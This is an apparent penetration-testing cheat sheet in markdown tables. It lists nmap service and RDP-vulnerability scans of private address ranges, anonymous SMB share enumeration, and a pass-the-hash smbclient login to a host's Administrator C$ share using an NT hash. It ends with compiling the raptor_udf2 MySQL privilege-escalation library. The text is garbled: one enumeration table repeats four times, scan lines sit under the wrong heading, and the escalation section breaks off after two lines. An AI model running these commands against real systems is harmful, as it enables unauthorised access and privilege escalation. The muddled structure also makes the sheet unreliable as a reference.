


| Services Enumeration  |
| ------------- |
| nmap -Pn -n --open -p500  192.168.0.0/24 |
| nmap -Pn -n --open -p161  192.168.0.0/24 |
| nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.6.0/24  |
| nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |


| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |
| smbclient \\\\10.10.10.103\\C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267 |
| nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
| nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |


| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |

| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |

| Linxu and Microsoft RPC Enumeration  |
| ------------- |
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| smbclient -N -L \\\\10.10.10.103 |

| MySQL UDF Privilge Escalation  |
| ------------- |
|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
| use mysql; |
